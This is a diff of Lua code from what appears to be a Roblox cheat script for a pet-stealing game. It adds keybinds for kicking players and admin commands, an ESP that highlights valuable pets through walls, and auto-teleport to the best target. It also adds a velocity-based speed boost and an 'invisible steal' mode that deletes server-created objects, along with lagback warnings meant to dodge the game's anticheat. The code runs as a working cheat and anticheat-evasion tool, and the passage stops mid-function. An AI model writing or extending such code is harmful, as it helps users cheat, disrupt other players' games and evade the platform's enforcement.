+Instance.new("UICorner", soundBox).CornerRadius = UDim.new(0, 4)
+soundBox.FocusLost:Connect(function()
+    Config.AlertSoundID = soundBox.Text
+    SaveConfig()
+    ShowNotification("ALERT SOUND", "Updated")
+end)
+
+CreateSectionHeader("JOB JOINER")
+local rJoinerRow = CreateRow("Job ID Joiner")
+CreateToggleSwitch(rJoinerRow, Config.ShowJobJoiner, function(ns, set)
+    set(ns); Config.ShowJobJoiner = ns; SaveConfig()
+    local gui = PlayerGui:FindFirstChild("BullysJobJoiner")
+    if gui then gui.Enabled = Config.ShowJobJoiner end
+    ShowNotification("JOB ID JOINER", ns and "ENABLED" or "DISABLED")
+end)
+local rJoinerKey = CreateRow("Job Joiner Keybind")
+local bJoinerKey = Instance.new("TextButton", rJoinerKey)
+bJoinerKey.Size=UDim2.new(0,60,0,24); bJoinerKey.Position=UDim2.new(1,-70,0.5,-12)
+bJoinerKey.BackgroundColor3=Theme.SurfaceHighlight; bJoinerKey.Text=Config.JobJoinerKey or "J"
+bJoinerKey.Font=Enum.Font.GothamBold; bJoinerKey.TextColor3=Theme.TextPrimary; bJoinerKey.TextSize=12
+Instance.new("UICorner",bJoinerKey).CornerRadius=UDim.new(0,4)
+bJoinerKey.MouseButton1Click:Connect(function()
+    bJoinerKey.Text="..."; bJoinerKey.TextColor3=Theme.Accent1
+    local con; con=UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType==Enum.UserInputType.Keyboard then
+            Config.JobJoinerKey=inp.KeyCode.Name; bJoinerKey.Text=inp.KeyCode.Name
+            bJoinerKey.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+            ShowNotification("JOB JOINER KEYBIND", inp.KeyCode.Name)
+        end
+    end)
+end)
+
+CreateSectionHeader("PROTECTION")
+local rAntiBeeDisco = CreateRow("Anti-Bee & Anti-Disco")
+CreateToggleSwitch(rAntiBeeDisco, Config.AntiBeeDisco, function(ns, set)
+    set(ns); Config.AntiBeeDisco = ns; SaveConfig()
+    if ns then
+        if _G.ANTI_BEE_DISCO and _G.ANTI_BEE_DISCO.Enable then
+            _G.ANTI_BEE_DISCO.Enable()
+        end
+    else
+        if _G.ANTI_BEE_DISCO and _G.ANTI_BEE_DISCO.Disable then
+            _G.ANTI_BEE_DISCO.Disable()
+        end
+    end
+    ShowNotification("ANTI-BEE & DISCO", ns and "ENABLED" or "DISABLED")
+end)
+
+CreateSectionHeader("CAMERA")
+local rFOV = CreateRow("FOV")
+local fovSliderBg = Instance.new("Frame", rFOV)
+fovSliderBg.Size = UDim2.new(0, 140, 0, 5)
+fovSliderBg.Position = UDim2.new(1, -200, 0.5, -2.5)
+fovSliderBg.BackgroundColor3 = Color3.fromRGB(30, 32, 38)
+Instance.new("UICorner", fovSliderBg).CornerRadius = UDim.new(1, 0)
+local fovFill = Instance.new("Frame", fovSliderBg)
+fovFill.BackgroundColor3 = Theme.Accent1
+fovFill.Size = UDim2.new(0, 0, 1, 0)
+Instance.new("UICorner", fovFill).CornerRadius = UDim.new(1, 0)
+local fovKnob = Instance.new("Frame", fovSliderBg)
+fovKnob.Size = UDim2.new(0, 12, 0, 12)
+fovKnob.BackgroundColor3 = Theme.TextPrimary
+fovKnob.AnchorPoint = Vector2.new(0.5, 0.5)
+fovKnob.Position = UDim2.new(0, 0, 0.5, 0)
+Instance.new("UICorner", fovKnob).CornerRadius = UDim.new(1, 0)
+local fovKnobStroke = Instance.new("UIStroke", fovKnob)
+fovKnobStroke.Color = Theme.Accent1
+fovKnobStroke.Thickness = 1.5
+fovKnobStroke.Transparency = 0.2
+local fovValLbl = Instance.new("TextLabel", rFOV)
+fovValLbl.Size = UDim2.new(0, 40, 0, 20)
+fovValLbl.Position = UDim2.new(1, -50, 0.5, -10)
+fovValLbl.BackgroundTransparency = 1
+fovValLbl.Text = string.format("%.1f", Config.FOV)
+fovValLbl.TextColor3 = Theme.TextPrimary
+fovValLbl.Font = Enum.Font.GothamBold
+fovValLbl.TextSize = 13
+
+local function updateFOVSlider(val)
+    val = math.clamp(val, 30, 180)
+    Config.FOV = val
+    SaveConfig()
+    fovValLbl.Text = string.format("%.1f", val)
+    local pct = (val - 30) / 150
+    fovFill.Size = UDim2.new(pct, 0, 1, 0)
+    fovKnob.Position = UDim2.new(pct, 0, 0.5, 0)
+    if Workspace.CurrentCamera then
+        Workspace.CurrentCamera.FieldOfView = val
+    end
+    ShowNotification("FIELD OF VIEW", string.format("%.1f", val))
+end
+updateFOVSlider(Config.FOV)
+
+local fovDragging = false
+fovSliderBg.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then fovDragging = true end
+end)
+UserInputService.InputEnded:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then fovDragging = false end
+end)
+UserInputService.InputChanged:Connect(function(i)
+    if fovDragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+        local x = i.Position.X
+        local r = fovSliderBg.AbsolutePosition.X
+        local w = fovSliderBg.AbsoluteSize.X
+        local p = (x - r) / w
+        updateFOVSlider(30 + (p * 150))
+    end
+end)
+
+CreateSectionHeader("MENU")
+    local rMenu = CreateRow("Menu Toggle Key")
+    local bMenu = Instance.new("TextButton", rMenu)
+    bMenu.Size=UDim2.new(0,80,0,24); bMenu.Position=UDim2.new(1,-90,0.5,-12)
+    bMenu.BackgroundColor3=Theme.SurfaceHighlight; bMenu.Text=Config.MenuKey
+    bMenu.Font=Enum.Font.GothamBold; bMenu.TextColor3=Theme.TextPrimary; bMenu.TextSize=12
+    Instance.new("UICorner",bMenu).CornerRadius=UDim.new(0,4)
+    bMenu.MouseButton1Click:Connect(function()
+        bMenu.Text="..."; bMenu.TextColor3=Theme.Accent1
+        local con; con=UserInputService.InputBegan:Connect(function(inp)
+            if inp.UserInputType==Enum.UserInputType.Keyboard then
+                Config.MenuKey=inp.KeyCode.Name; bMenu.Text=inp.KeyCode.Name
+                bMenu.TextColor3=Theme.TextPrimary; SaveConfig(); con:Disconnect()
+                ShowNotification("MENU KEYBIND", inp.KeyCode.Name)
+            end
+        end)
+    end)
+
+CreateSectionHeader("UI CONTROLS")
+local rLock = CreateRow("Lock UI Dragging")
+CreateToggleSwitch(rLock, Config.UILocked, function(ns, set)
+    set(ns); Config.UILocked = ns; SaveConfig()
+    ShowNotification("UI LOCK", ns and "ENABLED" or "DISABLED")
+end)
+
+
+local rReset = CreateRow("Reset UI Positions")
+local bReset = Instance.new("TextButton", rReset)
+bReset.Size=UDim2.new(0,80,0,24); bReset.Position=UDim2.new(1,-90,0.5,-12)
+bReset.BackgroundColor3=Theme.Error; bReset.Text="RESET"
+bReset.Font=Enum.Font.GothamBold; bReset.TextColor3=Theme.TextPrimary; bReset.TextSize=12
+Instance.new("UICorner",bReset).CornerRadius=UDim.new(0,4)
+bReset.MouseButton1Click:Connect(function()
+    Config.Positions = DefaultConfig.Positions
+    SaveConfig()
+    ShowNotification("UI RESET", "Positions restored")
+    sFrame.Position = UDim2.new(DefaultConfig.Positions.Settings.X, 0, DefaultConfig.Positions.Settings.Y, 0)
+    if PlayerGui:FindFirstChild("AutoStealUI") then
+        PlayerGui.AutoStealUI.Frame.Position = UDim2.new(DefaultConfig.Positions.AutoSteal.X, 0, DefaultConfig.Positions.AutoSteal.Y, 0)
+    end
+    if PlayerGui:FindFirstChild("XiAdminPanel") and PlayerGui.XiAdminPanel:FindFirstChild("Frame") then
+        PlayerGui.XiAdminPanel.Frame.Position = UDim2.new(DefaultConfig.Positions.AdminPanel.X, 0, DefaultConfig.Positions.AdminPanel.Y, 0)
+    end
+    if PlayerGui:FindFirstChild("XiAdminToolsPanel") and PlayerGui.XiAdminToolsPanel:FindFirstChild("Frame") then
+        PlayerGui.XiAdminToolsPanel.Frame.Position = UDim2.new(DefaultConfig.Positions.AdminToolsPanel.X, 0, DefaultConfig.Positions.AdminToolsPanel.Y, 0)
+    end
+    ShowNotification("UI RESET", "Positions restored to default")
+end)
+
+local function updateSettingsCanvasSize()
+    local contentHeight = sLayout.AbsoluteContentSize.Y
+    sList.CanvasSize = UDim2.new(0, 0, 0, math.max(contentHeight + 20, sList.AbsoluteSize.Y))
+end
+
+sLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSettingsCanvasSize)
+task.defer(updateSettingsCanvasSize)
+
+
+    sList.ScrollBarThickness = 0
+    sList.ScrollingEnabled = true
+    sList.ElasticBehavior = Enum.ElasticBehavior.Always
+
+    UserInputService.InputBegan:Connect(function(input, gp)
+        if input.KeyCode == safeKeyCode(Config.MenuKey, Enum.KeyCode.LeftControl) then
+            if _G.BullysSettingsUI and _G.BullysSettingsUI.panel then
+                _G.BullysSettingsUI.panel.Visible = not _G.BullysSettingsUI.panel.Visible
+            else
+                settingsGui.Enabled = not settingsGui.Enabled
+            end
+        end
+        if input.KeyCode == safeKeyCode(Config.KickKey, nil) then
+            kickPlayer()
+        end
+        if input.KeyCode == safeKeyCode(Config.RagdollSelfKey, nil) then
+            if not isOnCooldown("ragdoll") then
+                if runAdminCommand(LocalPlayer, "ragdoll") then
+                    activeCooldowns["ragdoll"] = tick()
+                    setGlobalVisualCooldown("ragdoll")
+                    ShowNotification("RAGDOLL SELF", "Ragdolled " .. LocalPlayer.Name)
+                end
+            else
+                ShowNotification("RAGDOLL SELF", "Ragdoll on cooldown")
+            end
+        end
+        if input.KeyCode == safeKeyCode(Config.ProximityAPKeybind, nil) then
+            ProximityAPActive = not ProximityAPActive
+            if SharedState.ProximityAPButton then
+                updateProximityAPButton()
+            end
+            ShowNotification("PROXIMITY AP", ProximityAPActive and "ENABLED" or "DISABLED")
+        end
+        if input.KeyCode == safeKeyCode(Config.ClickToAPKeybind, Enum.KeyCode.L) then
+            Config.ClickToAP = not Config.ClickToAP
+            SaveConfig()
+            ShowNotification("CLICK TO AP", Config.ClickToAP and "ENABLED" or "DISABLED")
+        end
+        if input.KeyCode == safeKeyCode(Config.JobJoinerKey, nil) then
+            local joinerGui = PlayerGui:FindFirstChild("BullysJobJoiner")
+            if joinerGui then
+                Config.ShowJobJoiner = not Config.ShowJobJoiner
+                joinerGui.Enabled = Config.ShowJobJoiner
+                SaveConfig()
+                ShowNotification("JOB ID JOINER", Config.ShowJobJoiner and "OPENED" or "CLOSED")
+            end
+        end
+    end)
+
+
+task.spawn(function()
+    task.wait(1)
+    if Config.HideAdminPanel then
+        local adUI = PlayerGui:FindFirstChild("XiAdminPanel")
+        if adUI then adUI.Enabled = false end
+    end
+    if Config.ShowAdminToolsPanel == false then
+        local toolsUI = PlayerGui:FindFirstChild("XiAdminToolsPanel")
+        if toolsUI then toolsUI.Enabled = false end
+    end
+    if Config.HideAutoSteal then
+        local asUI = PlayerGui:FindFirstChild("AutoStealUI")
+        if asUI then asUI.Enabled = false end
+    end
+    if Config.HideStatusHUD then
+        local g = PlayerGui:FindFirstChild("BullysStatusHUD")
+        if g then g.Enabled = false end
+    end
+    if Config.HideAutoBuyUI then
+        local g = PlayerGui:FindFirstChild("BullysAutoBuyUI")
+        if g then local p = g:FindFirstChild("ABPanel"); if p then p.Visible = false end end
+    end
+end)
+
+local function parseMinGen(str)
+    if not str or type(str) ~= "string" then return 0 end
+    str = str:gsub("%s", ""):lower()
+    if str == "" then return 0 end
+    local num, suffix = str:match("^([%d%.]+)([kmb]?)$")
+    if not num then return 0 end
+    num = tonumber(num)
+    if not num or num < 0 then return 0 end
+    if suffix == "k" then return num * 1e3
+    elseif suffix == "m" then return num * 1e6
+    elseif suffix == "b" then return num * 1e9
+    end
+    return num
+end
+
+if Config.TpSettings.TpOnLoad then
+    task.spawn(function()
+        while true do
+            local cache = SharedState.AllAnimalsCache
+            if (cache and #cache > 0) or SharedState.SelectedPetData then break end
+            RunService.Heartbeat:Wait()
+        end
+        local minGen = parseMinGen(Config.TpSettings.MinGenForTp)
+        if minGen > 0 then
+            local cache = SharedState.AllAnimalsCache or {}
+            if ((cache[1] and cache[1].genValue) or 0) < minGen then return end
+        end
+        local w=0; while not _G.tpToBestBrainrot and w<30 do RunService.Heartbeat:Wait(); w=w+1 end
+        if _G.tpToBestBrainrot then pcall(_G.tpToBestBrainrot) else runAutoSnipe() end
+    end)
+end
+
+
+LocalPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
+    local isStealing = LocalPlayer:GetAttribute("Stealing")
+    local wasStealing = not isStealing 
+
+    if isStealing then
+        if Config.AutoInvisDuringSteal and _G.toggleInvisibleSteal and not _G.invisibleStealEnabled then
+            _G.toggleInvisibleSteal()
+        end
+        if Config.AutoUnlockOnSteal then
+            triggerClosestUnlock(nil, 19)
+        end
+    elseif wasStealing then
+        if Config.AutoInvisDuringSteal and _G.toggleInvisibleSteal and _G.invisibleStealEnabled then
+            _G.toggleInvisibleSteal()
+        end
+    end
+end)
+
+task.spawn(function()
+    local oldSS = PlayerGui:FindFirstChild("StealSpeedUI")
+    if oldSS then oldSS:Destroy() end
+
+    local MIN_SPEED, MAX_SPEED = 5, 30
+    local stealSpeedEnabled = false
+    local STEAL_SPEED = math.clamp(math.floor((tonumber(Config.StealSpeed) or 20) + 0.5), MIN_SPEED, MAX_SPEED)
+    if Config.StealSpeed ~= STEAL_SPEED then
+        Config.StealSpeed = STEAL_SPEED
+        SaveConfig()
+    end
+    local stealConn = nil
+
+    local function doDisable()
+        stealSpeedEnabled = false
+        if stealConn then stealConn:Disconnect(); stealConn = nil end
+    end
+
+    local function doEnable()
+        stealSpeedEnabled = true
+        if stealConn then stealConn:Disconnect(); stealConn = nil end
+        stealConn = RunService.Heartbeat:Connect(function()
+            local char = LocalPlayer.Character
+            if not char then return end
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if not hum or not hrp then return end
+            local md = hum.MoveDirection
+            if md.Magnitude > 0 then
+                hrp.AssemblyLinearVelocity = Vector3.new(
+                    md.X * STEAL_SPEED, hrp.AssemblyLinearVelocity.Y, md.Z * STEAL_SPEED)
+            end
+        end)
+    end
+
+    SharedState.applyStealSpeedValue = function(s)
+        s = math.clamp(math.floor((tonumber(s) or STEAL_SPEED) + 0.5), MIN_SPEED, MAX_SPEED)
+        STEAL_SPEED = s
+        Config.StealSpeed = s
+        SaveConfig()
+        if SharedState._refreshMiniStealSpeedSlider then
+            pcall(SharedState._refreshMiniStealSpeedSlider)
+        end
+    end
+
+    SharedState.DisableStealSpeed = function()
+        doDisable()
+    end
+
+    SharedState.StealSpeedToggleFunc = function()
+        if stealSpeedEnabled then doDisable() else doEnable() end
+    end
+
+
+    task.spawn(function()
+        local lastHadSteal = nil
+        while true do
+            task.wait(0.3)
+            if not Config.AutoStealSpeed then lastHadSteal = nil; continue end
+            local hasSteal = (LocalPlayer:GetAttribute("Stealing") == true)
+            if lastHadSteal == hasSteal then continue end
+            lastHadSteal = hasSteal
+            if hasSteal and not stealSpeedEnabled then
+                doEnable()
+            elseif not hasSteal and stealSpeedEnabled then
+                doDisable()
+            end
+        end
+    end)
+end)
+
+task.spawn(function()
+    local brainrotESPEnabled = Config.BrainrotESP
+    local brainrotESPFolder = Instance.new("Folder")
+    brainrotESPFolder.Name = "BullysBrainrotESP"
+    brainrotESPFolder.Parent = Workspace
+    local brainrotBillboards = {}
+    local hiddenOverheads = {}
+    local MUT_COLORS = {
+        Cursed = Color3.fromRGB(170, 170, 170),
+        Gold = Color3.fromRGB(170, 170, 170),
+        Diamond = Color3.fromRGB(170, 170, 170),
+        YinYang = Color3.fromRGB(170, 170, 170),
+        Rainbow = Color3.fromRGB(170, 170, 170),
+        Lava = Color3.fromRGB(170, 170, 170),
+        Candy = Color3.fromRGB(170, 170, 170),
+        Bloodrot = Color3.fromRGB(170, 170, 170),
+        Radioactive = Color3.fromRGB(170, 170, 170),
+        Divine = Color3.fromRGB(170, 170, 170)
+    }
+    
+    local function createBrainrotBillboard(data)
+        local bb = Instance.new("BillboardGui")
+        bb.Name = "BrainrotESP_" .. data.uid
+        bb.Size = UDim2.new(0, 160, 0, 38)
+        bb.StudsOffset = Vector3.new(0, 1.8, 0)
+        bb.AlwaysOnTop = true
+        bb.LightInfluence = 0
+        bb.MaxDistance = 3000
+        
+        local hasMut = data.mutation and data.mutation ~= "None" and data.mutation ~= "N/A"
+        local color = hasMut and (MUT_COLORS[data.mutation] or Color3.fromRGB(175, 175, 175)) or Color3.fromRGB(175, 175, 175)
+        
+        local container = Instance.new("Frame", bb)
+        container.Size = UDim2.new(1, 0, 1, 0)
+        container.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        container.BackgroundTransparency = 0.5
+        container.BorderSizePixel = 0
+        Instance.new("UICorner", container).CornerRadius = UDim.new(0, 4)
+        
+        local stroke = Instance.new("UIStroke", container)
+        stroke.Color = color
+        stroke.Thickness = 1.5
+        stroke.Transparency = 0.2
+        
+        local nameLabel = Instance.new("TextLabel", container)
+        nameLabel.Size = UDim2.new(1, -6, 0, 18)
+        nameLabel.Position = UDim2.new(0, 3, 0, 2)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Font = Enum.Font.GothamBlack
+        nameLabel.TextSize = 13
+        nameLabel.TextColor3 = color
+        nameLabel.TextStrokeTransparency = 0
+        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        nameLabel.Text = (data.name or data.petName) or "???"
+        nameLabel.TextXAlignment = Enum.TextXAlignment.Center
+        
+        local genLabel = Instance.new("TextLabel", container)
+        genLabel.Size = UDim2.new(1, -6, 0, 14)
+        genLabel.Position = UDim2.new(0, 3, 0, 20)
+        genLabel.BackgroundTransparency = 1
+        genLabel.Font = Enum.Font.GothamBold
+        genLabel.TextSize = 11
+        genLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        genLabel.TextStrokeTransparency = 0
+        genLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        genLabel.Text = data.genText or ""
+        genLabel.TextXAlignment = Enum.TextXAlignment.Center
+        
+        if hasMut then
+            local mutBadge = Instance.new("TextLabel", bb)
+            mutBadge.Size = UDim2.new(0, 60, 0, 14)
+            mutBadge.Position = UDim2.new(0.5, -30, 0, -16)
+            mutBadge.BackgroundColor3 = color
+            mutBadge.BackgroundTransparency = 0.3
+            mutBadge.Font = Enum.Font.GothamBlack
+            mutBadge.TextSize = 9
+            mutBadge.TextColor3 = Color3.fromRGB(255, 255, 255)
+            mutBadge.TextStrokeTransparency = 0
+            mutBadge.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            mutBadge.Text = data.mutation:upper()
+            Instance.new("UICorner", mutBadge).CornerRadius = UDim.new(0, 3)
+        end
+        
+        return bb
+    end
+    
+    local function hideDefaultOverhead(overhead)
+        if overhead and overhead.Parent and not hiddenOverheads[overhead] then
+            hiddenOverheads[overhead] = overhead.Enabled
+            overhead.Enabled = false
+        end
+    end
+    
+    local function showDefaultOverhead(overhead)
+        if overhead and hiddenOverheads[overhead] ~= nil then
+            overhead.Enabled = hiddenOverheads[overhead]
+            hiddenOverheads[overhead] = nil
+        end
+    end
+    
+    local function restoreAllOverheads()
+        for overhead, wasEnabled in pairs(hiddenOverheads) do
+            if overhead and overhead.Parent then
+                overhead.Enabled = wasEnabled
+            end
+        end
+        hiddenOverheads = {}
+    end
+    
+    local function refreshBrainrotESP()
+        if not brainrotESPEnabled then return end
+        local cache = SharedState.AllAnimalsCache
+        if not cache or #cache == 0 then 
+            return 
+        end
+        
+        local seen = {}
+        for _, data in ipairs(cache) do
+            if data.genValue >= 10000000 then
+                seen[data.uid] = true
+                
+                if not brainrotBillboards[data.uid] then
+                    local adornee = nil
+                    local overhead = nil
+                    local studsOffset = Vector3.new(0, 1.8, 0)
+                    
+                    if data.overhead and data.overhead.Parent then
+                        overhead = data.overhead
+                        if overhead:IsA("BillboardGui") then
+                            studsOffset = overhead.StudsOffset
+                        end
+                        hideDefaultOverhead(overhead)
+                        adornee = overhead.Parent
+                        if not adornee:IsA("BasePart") then
+                            adornee = adornee:FindFirstChildWhichIsA("BasePart", true)
+                        end
+                    end
+                    
+                    if not adornee and data.plot and data.slot then
+                        adornee = findAdorneeGlobal(data)
+                        if adornee then
+                            local model = adornee.Parent
+                            if model and model:IsA("Model") then
+                                overhead = model:FindFirstChild("AnimalOverhead", true)
+                                if not overhead then
+                                    for _, child in ipairs(model:GetDescendants()) do
+                                        if child.Name == "AnimalOverhead" and child:IsA("BillboardGui") then
+                                            overhead = child
+                                            break
+                                        end
+                                    end
+                                end
+                                
+                                if overhead then
+                                    if overhead:IsA("BillboardGui") then
+                                        studsOffset = overhead.StudsOffset
+                                    end
+                                    hideDefaultOverhead(overhead)
+                                end
+                            end
+                        end
+                    end
+                    
+                    if adornee then
+                        local bb = createBrainrotBillboard(data)
+                        bb.Adornee = adornee
+                        bb.StudsOffset = studsOffset
+                        bb.Parent = adornee
+                        brainrotBillboards[data.uid] = {bb = bb, overhead = overhead}
+                    end
+                end
+            end
+        end
+        
+        for uid, entry in pairs(brainrotBillboards) do
+            if not seen[uid] then
+                if entry.bb then entry.bb:Destroy() end
+                if entry.overhead then showDefaultOverhead(entry.overhead) end
+                brainrotBillboards[uid] = nil
+            end
+        end
+    end
+    
+    local function clearBrainrotESP()
+        for _, entry in pairs(brainrotBillboards) do
+            if entry.bb then entry.bb:Destroy() end
+            if entry.overhead then showDefaultOverhead(entry.overhead) end
+        end
+        brainrotBillboards = {}
+        restoreAllOverheads()
+    end
+    
+    espToggleRef.setFn = function(enabled)
+        brainrotESPEnabled = enabled
+        if enabled then
+            task.spawn(function()
+                task.wait(1)
+                for i = 1, 5 do
+                    pcall(refreshBrainrotESP)
+                    task.wait(1)
+                end
+            end)
+        else
+            clearBrainrotESP()
+        end
+    end
+    
+    task.spawn(function()
+        while true do
+            task.wait(0.3)
+            if brainrotESPEnabled then
+                local cache = SharedState.AllAnimalsCache
+                if cache and #cache > 0 then
+                    pcall(refreshBrainrotESP)
+                end
+            end
+        end
+    end)
+    
+    task.spawn(function()
+        while true do
+            task.wait(2)
+            if brainrotESPEnabled then
+                local cache = SharedState.AllAnimalsCache
+                if cache and #cache > 0 then
+                    if next(brainrotBillboards) == nil then
+                        clearBrainrotESP()
+                    end
+                    pcall(refreshBrainrotESP)
+                end
+            end
+        end
+    end)
+end)
+
+task.spawn(function()
+	local animPlaying = false
+	local tracks = {}
+	local clone, oldRoot, hip, connection
+	local folderConnections = {}
+	local SINK_AMOUNT = 5
+	local serverGhosts = {}
+	local ghostEnabled = true
+	local lagbackCallCount = 0
+	local lagbackWindowStart = 0
+	local lastLagbackTime = 0
+	local errorOrbActive = false
+	local errorOrb = nil
+	local errorOrbConnection = nil
+
+	local function clearErrorOrb()
+		if errorOrb and errorOrb.Parent then errorOrb:Destroy() end
+		errorOrb = nil; errorOrbActive = false
+		if errorOrbConnection then errorOrbConnection:Disconnect(); errorOrbConnection = nil end
+	end
+
+	local function createErrorOrb()
+		if errorOrbActive then return end
+		errorOrbActive = true
+		for _, ghost in pairs(serverGhosts) do if ghost and ghost.Parent then ghost:Destroy() end end
+		serverGhosts = {}
+		local sg = Instance.new("ScreenGui")
+		sg.Name = "ErrorOrbGui"; sg.ResetOnSpawn = false
+		sg.Parent = LocalPlayer:WaitForChild("PlayerGui")
+		local fr = Instance.new("Frame")
+		fr.Size = UDim2.new(0, 500, 0, 60)
+		fr.Position = UDim2.new(0.5, -250, 0.3, 0)
+		fr.BackgroundTransparency = 1; fr.BorderSizePixel = 0; fr.Parent = sg
+		local l1 = Instance.new("TextLabel")
+		l1.Size = UDim2.new(1, 0, 0.5, 0); l1.BackgroundTransparency = 1
+		l1.Text = "ERROR CAUSED BY PLAYER DEATH"
+		l1.TextColor3 = Color3.fromRGB(255, 0, 0)
+		l1.TextStrokeTransparency = 0; l1.TextStrokeColor3 = Color3.new(0, 0, 0)
+		l1.Font = Enum.Font.SourceSansBold; l1.TextScaled = true; l1.Parent = fr
+		local l2 = Instance.new("TextLabel")
+		l2.Size = UDim2.new(1, 0, 0.5, 0); l2.Position = UDim2.new(0, 0, 0.5, 0)
+		l2.BackgroundTransparency = 1; l2.Text = "MUST RESET TO FIX ERROR"
+		l2.TextColor3 = Color3.fromRGB(255, 0, 0)
+		l2.TextStrokeTransparency = 0; l2.TextStrokeColor3 = Color3.new(0, 0, 0)
+		l2.Font = Enum.Font.SourceSansBold; l2.TextScaled = true; l2.Parent = fr
+		errorOrb = sg
+	end
+
+	local function createServerGhost(position)
+		if not ghostEnabled or errorOrbActive then return end
+		local now = tick()
+		if now - lastLagbackTime < 0.05 then return end
+		lastLagbackTime = now
+		if now - lagbackWindowStart > 1 then lagbackCallCount = 0; lagbackWindowStart = now end
+		lagbackCallCount = lagbackCallCount + 1
+		if lagbackCallCount >= 7 then createErrorOrb(); return end
+		for _, g in pairs(serverGhosts) do if g and g.Parent then g:Destroy() end end
+		serverGhosts = {}
+		local sg = Instance.new("ScreenGui")
+		sg.Name = "LagbackNotification"; sg.ResetOnSpawn = false
+		sg.Parent = LocalPlayer:WaitForChild("PlayerGui")
+		local sl = Instance.new("TextLabel")
+		sl.Size = UDim2.new(0, 500, 0, 30); sl.Position = UDim2.new(0.5, -250, 0.15, 0)
+		sl.BackgroundTransparency = 1; sl.Text = "LAGBACK DETECTED"
+		sl.TextColor3 = Color3.fromRGB(255, 0, 0)
+		sl.TextStrokeTransparency = 0; sl.TextStrokeColor3 = Color3.new(0, 0, 0)
+		sl.Font = Enum.Font.SourceSansBold; sl.TextScaled = true; sl.Parent = sg
+		local sw = Instance.new("TextLabel")
+		sw.Size = UDim2.new(0, 650, 0, 25); sw.Position = UDim2.new(0.5, -325, 0.15, 32)
+		sw.BackgroundTransparency = 1
+		sw.Text = "DISABLE INVISIBLE STEAL NOW OR YOU WILL BE KILLED BY ANTICHEAT"
+		sw.TextColor3 = Color3.fromRGB(200, 200, 200)
+		sw.TextStrokeTransparency = 0; sw.TextStrokeColor3 = Color3.new(0, 0, 0)
+		sw.Font = Enum.Font.SourceSansBold; sw.TextScaled = true; sw.Parent = sg
+		task.delay(1.5, function() if sg and sg.Parent then sg:Destroy() end end)
+		local ghost = Instance.new("Part")
+		ghost.Name = "LagbackGhost"; ghost.Shape = Enum.PartType.Ball
+		ghost.Size = Vector3.new(3, 3, 3); ghost.Color = Color3.fromRGB(255, 0, 0)
+		ghost.Material = Enum.Material.Glass; ghost.Transparency = 0.3
+		ghost.CanCollide = false; ghost.Anchored = true; ghost.CastShadow = false
+		ghost.Position = position + Vector3.new(0, 5, 0); ghost.Parent = Workspace.CurrentCamera
+		local bb = Instance.new("BillboardGui")
+		bb.Size = UDim2.new(0, 400, 0, 60); bb.StudsOffset = Vector3.new(0, 4, 0)
+		bb.AlwaysOnTop = true; bb.Parent = ghost
+		local bl = Instance.new("TextLabel")
+		bl.Size = UDim2.new(1, 0, 0, 25); bl.BackgroundTransparency = 1
+		bl.Text = "LAGBACK DETECTED"; bl.TextColor3 = Color3.fromRGB(255, 0, 0)
+		bl.TextStrokeTransparency = 0; bl.TextStrokeColor3 = Color3.new(0, 0, 0)
+		bl.Font = Enum.Font.SourceSansBold; bl.TextScaled = true; bl.Parent = bb
+		local bw = Instance.new("TextLabel")
+		bw.Size = UDim2.new(1, 0, 0, 25); bw.Position = UDim2.new(0, 0, 0, 25)
+		bw.BackgroundTransparency = 1
+		bw.Text = "DISABLE INVISIBLE STEAL NOW OR YOU WILL BE KILLED BY ANTICHEAT"
+		bw.TextColor3 = Color3.fromRGB(200, 200, 200)
+		bw.TextStrokeTransparency = 0; bw.TextStrokeColor3 = Color3.new(0, 0, 0)
+		bw.Font = Enum.Font.SourceSansBold; bw.TextScaled = true; bw.Parent = bb
+		table.insert(serverGhosts, ghost)
+	end
+
+	local function clearAllGhosts()
+		for _, ghost in pairs(serverGhosts) do pcall(function() if ghost and ghost.Parent then ghost:Destroy() end end) end
+		serverGhosts = {}; clearErrorOrb(); lagbackCallCount = 0; lastLagbackTime = 0
+		pcall(function()
+			local pg = LocalPlayer:FindFirstChild("PlayerGui")
+			if pg then for _, gui in pairs(pg:GetChildren()) do if gui.Name == "LagbackNotification" then gui:Destroy() end end end
+		end)
+		pcall(function() if Workspace.CurrentCamera then for _, c in pairs(Workspace.CurrentCamera:GetChildren()) do if c.Name == "LagbackGhost" then c:Destroy() end end end end)
+		pcall(function() for _, c in pairs(Workspace:GetDescendants()) do if c.Name == "LagbackGhost" then c:Destroy() end end end)
+	end
+
+	local function removeFolders()
+		local pf = Workspace:FindFirstChild(LocalPlayer.Name)
+		if not pf then return end
+		local dr = pf:FindFirstChild("DoubleRig")
+		if dr then
+			local rr = dr:FindFirstChild("HumanoidRootPart") or dr:FindFirstChildWhichIsA("BasePart")
+			if rr and ghostEnabled then createServerGhost(rr.Position) end
+			dr:Destroy()
+		end
+		local cs = pf:FindFirstChild("Constraints")
+		if cs then cs:Destroy() end
+		local conn = pf.ChildAdded:Connect(function(child)
+			if child.Name == "DoubleRig" then
+				task.defer(function()
+					local rr = child:FindFirstChild("HumanoidRootPart") or child:FindFirstChildWhichIsA("BasePart")
+					if rr and ghostEnabled then createServerGhost(rr.Position) end
+					child:Destroy()
+				end)
+			elseif child.Name == "Constraints" then child:Destroy() end
+		end)
+		table.insert(folderConnections, conn)
+	end
+
+	local function doClone()
+		local character = LocalPlayer.Character
+		if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
+			hip = character.Humanoid.HipHeight
+			oldRoot = character:FindFirstChild("HumanoidRootPart")
+			if not oldRoot or not oldRoot.Parent then return false end
+			for _, c in pairs(oldRoot:GetChildren()) do
